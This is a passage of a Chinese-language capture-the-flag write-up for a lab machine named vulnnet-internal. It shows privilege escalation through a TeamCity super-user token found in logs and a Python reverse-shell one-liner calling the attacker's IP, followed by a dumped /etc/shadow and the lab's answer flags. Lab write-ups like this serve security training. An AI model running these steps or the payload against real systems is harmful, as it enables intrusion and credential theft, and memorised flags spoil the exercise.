   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@vulnnet-internal:~$ whoami
sys-internal
sys-internal@vulnnet-internal:~$ id
uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)
sys-internal@vulnnet-internal:~$ 
```

找到了第一个flag。

```
sys-internal@vulnnet-internal:/home$ find / -name services.txt 2>/dev/null
/opt/shares/temp/services.txt
sys-internal@vulnnet-internal:/home$ cat /opt/shares/temp/services.txt
THM{0a09d51e488f5fa105d8d866a497440a}
```

上传LinEnum并执行。

```
┌──(root㉿kali)-[~/Downloads]
└─# scp LinEnum.sh sys-internal@10.10.21.145:/home/sys-internal
LinEnum.sh
```

```
sys-internal@vulnnet-internal:~$ chmod +x LinEnum.sh
```

```
### NETWORKING  ##########################################
[-] Network and IP info:
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:41:53:a7:ee:15 brd ff:ff:ff:ff:ff:ff
    inet 10.10.21.145/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3463sec preferred_lft 3463sec
    inet6 fe80::41:53ff:fea7:ee15/64 scope link 
       valid_lft forever preferred_lft forever


[-] ARP history:
10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa REACHABLE


[-] Nameserver(s):
nameserver 127.0.0.53

[-] Default route:
default via 10.10.0.1 dev eth0 proto dhcp src 10.10.21.145 metric 100 

[-] Listening TCP:
State   Recv-Q   Send-Q           Local Address:Port        Peer Address:Port   
LISTEN  0        50                     0.0.0.0:139              0.0.0.0:*      
LISTEN  0        128                    0.0.0.0:6379             0.0.0.0:*      
LISTEN  0        64                     0.0.0.0:45643            0.0.0.0:*      
LISTEN  0        128                    0.0.0.0:111              0.0.0.0:*      
LISTEN  0        128                    0.0.0.0:37173            0.0.0.0:*      
LISTEN  0        128              127.0.0.53%lo:53               0.0.0.0:*      
LISTEN  0        128                    0.0.0.0:22               0.0.0.0:*      
LISTEN  0        5                    127.0.0.1:631              0.0.0.0:*      
LISTEN  0        128                    0.0.0.0:39001            0.0.0.0:*      
LISTEN  0        50                     0.0.0.0:445              0.0.0.0:*      
LISTEN  0        64                     0.0.0.0:2049             0.0.0.0:*      
LISTEN  0        128                    0.0.0.0:45249            0.0.0.0:*      
LISTEN  0        5                      0.0.0.0:873              0.0.0.0:*      
LISTEN  0        128                      [::1]:6379                [::]:*      
LISTEN  0        50                        [::]:139                 [::]:*      
LISTEN  0        128                       [::]:41645               [::]:*      
LISTEN  0        100         [::ffff:127.0.0.1]:8111                   *:*      
LISTEN  0        128                       [::]:111                 [::]:*      
LISTEN  0        128                       [::]:22                  [::]:*      
LISTEN  0        64                        [::]:42583               [::]:*      
LISTEN  0        128                       [::]:40759               [::]:*      
LISTEN  0        5                        [::1]:631                 [::]:*      
LISTEN  0        50                           *:46493                  *:*      
LISTEN  0        50                        [::]:445                 [::]:*      
LISTEN  0        64                        [::]:2049                [::]:*      
LISTEN  0        128                       [::]:49345               [::]:*      
LISTEN  0        50                           *:9090                   *:*      
LISTEN  0        50          [::ffff:127.0.0.1]:58535                  *:*      
LISTEN  0        1           [::ffff:127.0.0.1]:8105                   *:*      
LISTEN  0        5                         [::]:873                 [::]:*      


[-] Listening UDP:
State   Recv-Q   Send-Q           Local Address:Port        Peer Address:Port   
UNCONN  0        0                      0.0.0.0:5353             0.0.0.0:*      
UNCONN  0        0                      0.0.0.0:47532            0.0.0.0:*      
UNCONN  0        0                      0.0.0.0:37322            0.0.0.0:*      
UNCONN  0        0                      0.0.0.0:59879            0.0.0.0:*      
UNCONN  0        0                      0.0.0.0:56018            0.0.0.0:*      
UNCONN  0        0                      0.0.0.0:926              0.0.0.0:*      
UNCONN  0        0                      0.0.0.0:2049             0.0.0.0:*      
UNCONN  0        0                127.0.0.53%lo:53               0.0.0.0:*      
UNCONN  0        0            10.10.21.145%eth0:68               0.0.0.0:*      
UNCONN  0        0                      0.0.0.0:111              0.0.0.0:*      
UNCONN  0        0                10.10.255.255:137              0.0.0.0:*      
UNCONN  0        0                 10.10.21.145:137              0.0.0.0:*      
UNCONN  0        0                      0.0.0.0:137              0.0.0.0:*      
UNCONN  0        0                10.10.255.255:138              0.0.0.0:*      
UNCONN  0        0                 10.10.21.145:138              0.0.0.0:*      
UNCONN  0        0                      0.0.0.0:138              0.0.0.0:*      
UNCONN  0        0                      0.0.0.0:41129            0.0.0.0:*      
UNCONN  0        0                         [::]:5353                [::]:*      
UNCONN  0        0                         [::]:44431               [::]:*      
UNCONN  0        0                         [::]:46487               [::]:*      
UNCONN  0        0                         [::]:51849               [::]:*      
UNCONN  0        0                         [::]:50069               [::]:*      
UNCONN  0        0                         [::]:926                 [::]:*      
UNCONN  0        0                         [::]:35810               [::]:*      
UNCONN  0        0                         [::]:2049                [::]:*      
UNCONN  0        0                         [::]:111                 [::]:*      
```

在目标上发现了tcp端口127.0.0.1:631，是一个Web应用程序。

要通过本地浏览器访问目标主机上的127.0.0.1:631端口，您可以使用SSH端口转发（SSH Port Forwarding）来建立一个安全的隧道。以下是执行此操作的步骤：

1. 打开终端，并使用以下命令通过SSH建立端口转发：

   ```bash
   ssh -L 631:127.0.0.1:631 user@target_ip
   ```

   其中，`user` 是您在目标主机上的有效用户名，`target_ip` 是目标主机的IP地址。

   这将在您本地主机的631端口和目标主机的127.0.0.1:631之间建立一个隧道。

2. 输入目标主机的密码（如果需要）以建立SSH连接。

3. 在成功建立SSH连接后，您可以在本地浏览器中访问 `http://127.0.0.1:631`，它将通过SSH隧道转发到目标主机的631端口。

请注意，这将创建一个安全的加密通道，使您能够在本地浏览器中访问目标主机上的服务，而无需将端口直接暴露在互联网上。确保您具有合法授权来执行此操作，并在完成后安全地关闭SSH连接。

```
┌──(root㉿kali)-[~/Downloads]
└─# ssh -L 631:127.0.0.1:631 sys-internal@10.10.21.145         
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Aug 11 05:02:01 2023 from 10.18.72.222
sys-internal@vulnnet-internal:~$ 
```

访问：http://127.0.0.1:631/，发现Web应用程序的版本信息：CUPS 2.2.7

[CUPS Local Privilege Escalation And Sandbox Escapes](https://www.aon.com/cyber-solutions/aon_cyber_labs/cups-local-privilege-escalation-and-sandbox-escapes/)

该版本可能存在权限提升漏洞，但是没有公开的exploit。

```
sys-internal@vulnnet-internal:~$ find / -name cupsd.conf 2>/dev/null
/etc/cups/cupsd.conf
```

重启了实验室：

Target IP Address : 10.10.181.118

Kali Linux : 10.18.72.222

从/etc/cups/cupsd.conf中，可以发现如下的目录：

access to the admin pages

http://127.0.0.1:631/admin

access to configuration files

http://127.0.0.1:631/admin/conf

Unauthorized

Enter your username and password or the root username and password to access this page. If you are using Kerberos authentication, make sure you have a valid Kerberos ticket.

access to log files

http://127.0.0.1:631/admin/log

Unauthorized

Enter your username and password or the root username and password to access this page. If you are using Kerberos authentication, make sure you have a valid Kerberos ticket.

利用点不在这。

在/目录下，发现名为TeamCity的目录。

```
sys-internal@vulnnet-internal:/$ ls -al
total 533824
drwxr-xr-x  24 root root      4096 Feb  6  2021 .
drwxr-xr-x  24 root root      4096 Feb  6  2021 ..
drwxr-xr-x   2 root root      4096 Feb  2  2021 bin
drwxr-xr-x   3 root root      4096 Feb  1  2021 boot
drwx------   2 root root      4096 Feb  1  2021 .cache
drwxr-xr-x  17 root root      3720 Aug 11 10:45 dev
drwxr-xr-x 129 root root     12288 Feb  7  2021 etc
drwxr-xr-x   3 root root      4096 Feb  1  2021 home
lrwxrwxrwx   1 root root        34 Feb  1  2021 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root        33 Feb  1  2021 initrd.img.old -> boot/initrd.img-4.15.0-20-generic
drwxr-xr-x  18 root root      4096 Feb  1  2021 lib
drwxr-xr-x   2 root root      4096 Feb  1  2021 lib64
drwx------   2 root root     16384 Feb  1  2021 lost+found
drwxr-xr-x   4 root root      4096 Feb  2  2021 media
drwxr-xr-x   2 root root      4096 Feb  1  2021 mnt
drwxr-xr-x   4 root root      4096 Feb  2  2021 opt
dr-xr-xr-x 138 root root         0 Aug 11 10:44 proc
drwx------   8 root root      4096 Feb  6  2021 root
drwxr-xr-x  27 root root       880 Aug 11 10:52 run
drwxr-xr-x   2 root root      4096 Feb  2  2021 sbin
drwxr-xr-x   2 root root      4096 Feb  1  2021 srv
-rw-------   1 root root 546529280 Feb  1  2021 swapfile
dr-xr-xr-x  13 root root         0 Aug 11 10:44 sys
drwxr-xr-x  12 root root      4096 Feb  6  2021 TeamCity
drwxrwxrwt  11 root root      4096 Aug 11 11:01 tmp
drwxr-xr-x  10 root root      4096 Feb  1  2021 usr
drwxr-xr-x  13 root root      4096 Feb  1  2021 var
lrwxrwxrwx   1 root root        31 Feb  1  2021 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root        30 Feb  1  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-20-generic
```

```
sys-internal@vulnnet-internal:/TeamCity$ ls -al
total 76
drwxr-xr-x 12 root root  4096 Feb  6  2021 .
drwxr-xr-x 24 root root  4096 Feb  6  2021 ..
drwxr-xr-x  2 root root  4096 Feb  6  2021 bin
-rw-r--r--  1 root root     0 Feb  6  2021 BUILD_85899
drwxr-xr-x 13 root root  4096 Aug 11 10:45 buildAgent
drwxr-xr-x  3 root root  4096 Aug 11 10:47 conf
drwxr-xr-x  5 root root  4096 Feb  6  2021 devPackage
drwxr-xr-x  2 root root  4096 Feb  6  2021 lib
drwxr-xr-x  2 root root  4096 Feb  6  2021 licenses
drwxr-xr-x  2 root root  4096 Aug 11 10:47 logs
-rw-r--r--  1 root root   355 Feb  6  2021 service.properties
-rw-r--r--  1 root root   994 Feb  6  2021 TeamCity-readme.txt
drwxr-xr-x  6 root root  4096 Aug 11 10:51 temp
-rw-r--r--  1 root root 16984 Feb  6  2021 Tomcat-running.txt
drwxr-xr-x  3 root root  4096 Feb  6  2021 webapps
drwxr-x---  3 root root  4096 Feb  6  2021 work
```

teamcity以root权限运行：

```
sys-internal@vulnnet-internal:~$ ps aux | grep teamcity
root       569  0.0  0.0   4628   652 ?        S    10:45   0:00 sh teamcity-server.sh _start_internal
root       579  0.0  0.0   4752  1868 ?        S    10:45   0:00 sh /TeamCity/bin/teamcity-server-restarter.sh run

...
```

在TeamCity/TeamCity-readme.txt中，发现安装帮助文档：https://www.jetbrains.com/help/teamcity/install-and-start-teamcity-server.html

在目标监听的TCP端口上，可以看到在IPV6的 `[::ffff:127.0.0.1]:8111` 上正在监听。

要使用 `find` 命令在文件系统中查找包含特定字符串（如 "password"）的文件，可以使用以下命令：

```bash
find /path/to/search -type f -exec grep -l "password" {} +
```

在这个命令中：

- `/path/to/search`：将被搜索的起始路径替换为你要搜索的实际路径。
- `-type f`：限定搜索只查找文件，不包括目录。
- `-exec grep -l "password" {} +`：在找到的每个文件上执行 `grep -l "password"`，其中：
  - `-l` 选项表示只显示包含匹配字符串的文件名。
  - `{}` 用于表示找到的文件名。
  - `+` 表示将多个文件名一起传递给 `grep` 命令，以提高效率。

示例用法：

```bash
find / -type f -exec grep -l "password" {} +
```

上述命令将从根目录开始递归地搜索包含 "password" 字符串的所有文件，并将结果列出。

```
sys-internal@vulnnet-internal:/TeamCity$ find . -type f -exec grep -l "password" {} + 2>/dev/null

./logs/catalina.out

```

```
┌──(root㉿kali)-[~/Downloads]
└─# scp sys-internal@10.10.181.118:/TeamCity/logs/catalina.out /root/Downloads/
catalina.out                                                                                                               100%  161KB  85.6KB/s   00:01  
```

查看catalina.out文件，发现Super user authentication token。

```
TeamCity initialized, server UUID: 61907dff-244c-4220-b252-31de83974909, URL: http://localhost
TeamCity is running in professional mode
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
```

```
TeamCity initialized, server UUID: 61907dff-244c-4220-b252-31de83974909, URL: http://localhost:8111
TeamCity is running in professional mode
[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
```

```
TeamCity initialized, server UUID: 61907dff-244c-4220-b252-31de83974909, URL: http://localhost:8111
TeamCity is running in professional mode
[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
```

```
TeamCity initialized, server UUID: 61907dff-244c-4220-b252-31de83974909, URL: http://localhost:8111
TeamCity is running in professional mode
[TeamCity] Super user authentication token: 8364347591928153180 (use empty username with the token as the password to access the server)
```

要通过SSH将位于目标 `[::ffff:127.0.0.1]:8111` 的应用程序代理到 Kali 浏览器中进行访问，可以使用 SSH 的端口转发功能。这将允许你在本地计算机上通过 SSH 隧道访问远程应用程序。

以下是在 Kali Linux 中执行此操作的步骤：

1. 打开终端并使用以下命令建立 SSH 连接，将远程主机的端口转发到本地：
   
   ```bash
   ssh -L 8111:[::ffff:127.0.0.1]:8111 user@remote_host
   ```
   
   在命令中，将 `user` 替换为远程主机的用户名，`remote_host` 替换为远程主机的地址或主机名。这将在本地计算机的端口 `8111` 上创建一个监听，将流量转发到远程主机的 `[::ffff:127.0.0.1]:8111`。
   
   请确保 SSH 服务器允许端口转发。如果你的 SSH 服务器配置有限制，可能需要在服务器端进行一些额外的设置。

2. 确保远程主机上的应用程序正在监听 `[::ffff:127.0.0.1]:8111` 地址和端口。如果应用程序绑定在本地 `127.0.0.1` 地址上，通过 SSH 转发，你将能够在 Kali 中访问该应用程序。

3. 打开 Kali 浏览器，并在地址栏中输入 `http://localhost:8111`，然后按下 Enter 键。

这样，Kali 浏览器将通过 SSH 隧道连接到远程主机上的应用程序，并在本地计算机上进行访问。

```
┌──(root㉿kali)-[~/Downloads]
└─# ssh -L 8111:[::ffff:127.0.0.1]:8111 sys-internal@10.10.181.118             
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Aug 11 10:52:22 2023 from 10.18.72.222
```

访问http://127.0.0.1:8111/login.html：

看到Log in to TeamCity页面，有一条警告信息：No System Administrator found. Log in as a Super user to create an administrator account. 

使用空Username和从/TeamCity/logs/catalina.out中找到的token: 8364347591928153180 作为密码，来访问服务器。

登录成功，在http://127.0.0.1:8111/，点击 Create project，然后选择 Manually -> Name: Shell。

在http://127.0.0.1:8111/admin/editProject.html?projectId=Shell，

Build Configurations (100 left)

Build configurations define how to retrieve and build sources of a project. 

点击Create buil configuration。

在Create Build Configuration页面中，在Name字段下输入shell。

http://127.0.0.1:8111/admin/editBuild.html?id=buildType:Shell_Shell

在左边栏点击Build Steps：

Build Steps

In this section you can configure the sequence of build steps to be executed. Each build step is represented by a build runner and provides integration with a specific build or test tool. 

点击Add build step

Runner type: Python

Step name: sheller

Command: Custom script

Script: * Custom Python script: 

```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.72.222",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
```

保存。

http://127.0.0.1:8111/admin/editBuildRunners.html?id=buildType:Shell_Shell

页面右上角有个提示：You can now run the first build in this build configuration!

点击Run。获取到目标上root权限的reverse shell。

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234                                                                
listening on [any] 1234 ...
connect to [10.18.72.222] from (UNKNOWN) [10.10.181.118] 50148
root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f# whoami
whoami
root
root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f# id
id
uid=0(root) gid=0(root) groups=0(root)
root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f# cd /root
cd /root
root@vulnnet-internal:~# ls -al
ls -al
total 44
drwx------  8 root root 4096 Feb  6  2021 .
drwxr-xr-x 24 root root 4096 Feb  6  2021 ..
lrwxrwxrwx  1 root root    9 Feb  1  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-x---  6 root root 4096 Aug 11 10:47 .BuildServer
drwx------  2 root root 4096 Feb  6  2021 .cache
drwx------  4 root root 4096 Feb  6  2021 .config
drwx------  3 root root 4096 Feb  6  2021 .dbus
drwxr-xr-x  3 root root 4096 Feb  2  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
lrwxrwxrwx  1 root root    9 Feb  2  2021 .rediscli_history -> /dev/null
-rw-------  1 root root   38 Feb  6  2021 root.txt
drwx------  4 root root 4096 Feb  6  2021 .thumbnails
root@vulnnet-internal:~# cat root.txt
cat root.txt
THM{e8996faea46df09dba5676dd271c60bd}
```

```
root@vulnnet-internal:~# cat /etc/shadow
cat /etc/shadow
root:$6$fEQooO2J$Gv5PA9nNgH/R1rcyVQnoPV8ssRlrOLBM6reVaJhR8N9oqrImz7PSGdsJ2l.fXmJFFibDyUx2lbuST26Meoth70:18664:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
lightdm:*:18659:0:99999:7:::
whoopsie:*:18659:0:99999:7:::
kernoops:*:18659:0:99999:7:::
pulse:*:18659:0:99999:7:::
avahi:*:18659:0:99999:7:::
hplip:*:18659:0:99999:7:::
sys-internal:$6$xXg2RXMp$0uJrk57nc93/6/GpkBhPYdQP9LZp4FV7vIBVEGrmP6WZ5Kxmg289ZNba073J4Lr43ta7cuSfYpyU9nzlRhDyQ/:18664:0:99999:7:::
redis:*:18659:0:99999:7:::
sshd:*:18659:0:99999:7:::
statd:*:18660:0:99999:7:::
```

Answer the questions below

What is the services flag? (services.txt)

THM{0a09d51e488f5fa105d8d866a497440a}

What is the internal flag? ("internal flag")

THM{ff8e518addbbddb74531a724236a8221}

What is the user flag? (user.txt)

THM{da7c20696831f253e0afaca8b83c07ab}

What is the root flag? (root.txt)

THM{e8996faea46df09dba5676dd271c60bd}